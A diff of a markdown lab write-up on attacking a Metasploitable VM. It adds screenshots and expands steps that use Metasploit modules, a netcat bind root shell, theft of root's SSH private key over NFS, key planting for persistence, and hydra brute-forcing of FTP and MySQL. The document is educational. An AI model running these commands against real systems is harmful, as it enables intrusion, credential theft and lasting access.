@@ -633,14 +633,15 @@ msf auxiliay(scanner/rservices/rsh_login) > show options
 msf auxiliay(scanner/rservices/rsh_login) > run
 ```
 **Output**
-![](../images/exploiting_rshell_services_1)
-![](../images/exploiting_rshell_services_2)
-![](../images/exploiting_rshell_services_3)
+![](../images/exploiting_rshell_services_1.png)
+![](../images/exploiting_rshell_services_2.png)
+![](../images/exploiting_rshell_services_3.png)
 Here we got a root shell to the rshell services using anonymous login vulnerability.
 
 ---
 
 ## Exploiting Service on Port 1099: Java-rmi ->GNU Classpath grmiregistry
+![](../images/service_on_port_1099.png)
 **RMI(Remote Method Invocation)** is an API that allow an object/java program to invoke another method that exist in seprate address space(i.e on remote local machine or remote server), i.e it is simply used to call a method that is present on the remote server from a local machine. Specifically, `grmiregistry` (GNU Classpath's RMI Registry) on Metasploitable provides a registry of RMI server objects on port `1099`. This registry facilitates remote clients in locating and binding to objects for method invocations, i.e provide lookup(using lookup()) for object id used to call the desired funtion. It is a namespace on which all server objects are placed.
 It has three main components->
 **1. RMI Registry**
@@ -677,11 +678,15 @@ msf exploit(multi/misc/java_rmi_server) > set SRVHOST 192.168.1.101
 msf exploit(multi/misc/java_rmi_server) > set SRVPORT 8080
 msf exploit(multi/misc/java_rmi_server) > run
 ```
-![]()
+![](../images/exploiting_java_rmi_1.png)
+![](../images/exploiting_java_rmi_2.png)
+![](../images/exploiting_java_rmi_3.png)
 **Output**
+![](../images/exploiting_java_rmi_4.png)
 Here we got a meterpreter session, we can futher proced with post exploitation things like maintaining access...
 
 ## Exploiting Service on Port 1524: bind shell ->metasploitable root shell
+![](../images/service_on_port_1524.png)
 On port 1524 often runs a simple Bind Shell. This is an intentional service that acts as an unsecured, open shell on the system which directy provide the remote root shell on the system. When Metasploitable was designed as a vulnerable testing environment, this service was left open and unprotected to simulate a backdoor which often left by malicious actors after a system compromise.
 
 ### Identifying Vulnerabilites or Weakness
@@ -692,14 +697,17 @@ To exploit this, We need to just simply connect to this shell using netcat, ncat
 ```
 nc 192.168.1.103 1524
 ```
+![](../images/exploiting_bind_shell_using_netcat.png)
 **Using telnet**
 ```
 telnet 192.168.1.103
 ```
-**Output** Here we simply got the root shell on the target and we can proced for further post exploitation things...
+![](../images/exploiting_bind_shell_using_telnet.png)
+Here we simply got the **root** shell on the target and we can proced for further post exploitation things...
 
 ---
 ## Exploiting Service on Port 2049: nfs -> 2-4 (RPC 100003)
+![](../images/service_on_port_2049.png)
 NFS (Network File System) is a protocol that allows a computer to access files over a network as if they were on its local storage. NFS enables centralized file storage, making it possible for multiple clients to access, modify, and share files on a remote server.
 NFS uses the client-server model. The server exports a directory, and the client mounts it over the network. This mount point then behaves as if it were part of the local filesystem.
 
@@ -726,6 +734,8 @@ cd /tmp/target/
 #Theifting the target private keys
 cat /tmp/target/root/id_rsa >> /home/kali/target_private_rsa
 ```
+![](../images/mounting_nfs_share_1.png)
+![](../images/mounting_nfs_share_2.png)
 Here we mounted the target file system on our local machine, and we can theft sensitive file and data of the target. Here I theft the private key of the target, with which we can access any target which trust the target. We can also go to get the 'etc/passwd' file and 'etc/shadow' file to get information about the users and their password hashes.
 ### Post Exploitation things
 Here we can upload our own ssh public key on the target's authorized keys dir to get a remote shell on the target, which we can used to easily connect to target in future and get a RCE on the target.
@@ -739,7 +749,8 @@ Now we can get remote shell on the target using the private key, whenever we wan
 ```
 ssh root@192.168.1.103
 ```
-So, here we used the misconfigured nfs file share system to get access the target '/' file system and steal senstive data from the target.
+![](../images/post_exploitation_using_ssh_public_key.png)
+So, here we used the misconfigured nfs file share system to get access the target '/' file system and steal senstive data like target private key from the target and planting our own ssh-public key to get a persistent connection in future.
 
 ### Prevention from such attack
 NFS was designed for local networks, so it lacks strong built-in security features. Consider the following security measures when deploying NFS:
@@ -751,6 +762,7 @@ NFS was designed for local networks, so it lacks strong built-in security featur
 ---
 
 ## Exploiting Service on Port 2121 ftp -> proftpd 1.3.1
+![](../images/service_on_port_2121.png)
 It is also a similar ftp service running on the port 21 but with different vendor. It is also used to share file between the ftp server and ftp clients. 
 ### Identifying Vulnerabilites or Weakness
 From my exploration about this service version we can't find a well known vulnerability in this particular service version. But we can perform the bruteforce attack on this service using tool like metasploit and hydra it is set to weak or default cruedentials, i.e we go for **Bruteforcing attak**
@@ -768,11 +780,16 @@ msf auxiliary(scanner/ftp/ftp_login) > set PASS_FiLE /home/kali/bruteforce.txt
 msf auxiliary(scanner/ftp/ftp_login) > set verbose true
 msf auxiliary(scanner/ftp/ftp_login) > run
 ```
+![](../images/bruteforcing_proftpd_service_using_metasploit_1.png)
+![](../images/bruteforcing_proftpd_service_using_metasploit_2.png)
+![](../images/bruteforcing_proftpd_service_using_metasploit_3.png)
 Here we get the ftp is defaut crudential of metasploitable **msfadmin** as password **msfadmin** and **user**
 **Bruteforcing using hydra**
 ```
 hydra -L /home/kali/bruteforce.txt -P /usr/share/seclists/Password/Leaked-Databases/rockyou-35.txt -V -e nsr -s 2121 192.168.1.103 ftp
 ```
+![](../images/bruteforcing_proftpd_using_hydra_1.png)
+![](../images/bruteforcing_proftpd_using_hydra_2.png)
 we got the same bruteforce result..
 
 **Hence we got the crudential, we can logged into the ftp server using the kali ftp client..**
@@ -780,13 +797,19 @@ we got the same bruteforce result..
 ftp 192.168.1.103 2121
 #logged in using msfadmin msfadmin
 ```
+![](../images/connecting_to_proftpd_server_using_ftp_client.png)
 Now we get connected to the ftp server, we can send file or download file from the target using ftp cleint command
 ```
-ftp > put file
-ftp >
+ftp > pwd
+ftp > ls
+#putting the file on the ftp server from attacker machine
+ftp > put test.txt test.txt
+#Getting the file form the ftp server
+ftp > get test.txt file_get.txt
 ```
-
+![](../images/connecting_to_proftpd_server_using_ftp_client_2.png)
 ## Exploiting Service on Port 3306 mysql -> Mysql 5.0.51a
+![](../images/service_on_port_3306.png)
 MySQL is an open-source relational database management system (RDBMS) commonly used for storing, managing, and retrieving data for web applications and services. MySQL uses SQL (Structured Query Language) for querying and managing databases. It’s widely used due to its speed, reliability, and compatibility with various platforms. It was normally used for website for storing data in small enterprises. As this service stores the sensitive data of the different clients so its securing is very concern.
 ### Identifying Vulnerabilites or Weakness
 **1. Login allowed without Password** On target system this service is misconfigured to allowed login with just username and without password. We can simply use **mysql client** to connect to this misconfigured database server when we get a username.
@@ -799,6 +822,7 @@ So we simply tries to connect using the mysql client of kali
 #since the mysql server running on the target metasploitable is old and don't support ssl certification, so set the variable to false
 mysql -u root -h 192.168.1.103 --ssl=FALSE
 ```
+![](../images/connecting_to_mysql_using_mysql_module.png)
 Here we got connected to the mysql server without password. Hurray...
 ##### Bruteforcing with metasploit or hydra
 **Using Metasploit module
@@ -813,6 +837,7 @@ msf auxiliary(scanner/mysql/mysql_login) > set PASS_FILE /usr/share/seclist/Pass
 msf auxiliary(scanner/mysql/mysql_login) > set Blank_password true
 msf auxiliary(scanner/mysql/mysql_login) > run
 ```
+![](../images/
 Here we got that there is two user- 'root' and 'guest' which we can log in without password 
 
 **Using Hydra**
